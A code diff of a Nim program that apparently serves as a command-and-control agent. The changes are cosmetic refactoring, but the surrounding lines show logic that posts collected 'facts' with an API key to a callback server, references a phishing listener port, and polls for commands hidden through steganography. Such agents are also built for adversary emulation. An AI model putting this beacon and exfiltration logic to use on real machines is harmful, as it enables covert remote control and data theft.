@@ -5,8 +5,8 @@ import std/strutils
 import std/uri
 import std/os
 import std/asyncdispatch
-import pixie
 import std/json
+import pixie
 import steganography
 
 type
@@ -43,7 +43,7 @@ proc parse_instruction(command: string, location: string, cmd_line: string, ip_a
             var client = newHttpClient()
             var headers = newHttpHeaders({"authorization": api_key})
             var js = %*res
-            var resp = client.request(&"http://{ip_address}:{cb_port}/facts", httpMethod = HttpPost, headers=headers, body= $js)
+            discard client.request(&"http://{ip_address}:{cb_port}/facts", httpMethod = HttpPost, headers=headers, body= $js)
             client.close()
             result = true
     else:
@@ -59,7 +59,6 @@ proc quit_listen(ip_address: string, phishing_port: string): Future[bool]=
         listenResult.complete(true)
     except:
         listenResult.complete(false)
-
     client.close()
     return listenResult
 
@@ -114,5 +113,5 @@ when isMainModule:
                 if args.val != "":
                     sleep_time = args.val.parseInt()
         of cmdArgument:
-            echo(&"ERROR")
+            echo("ERROR")
     waitFor handle_loop(default_stego, sleep_time)
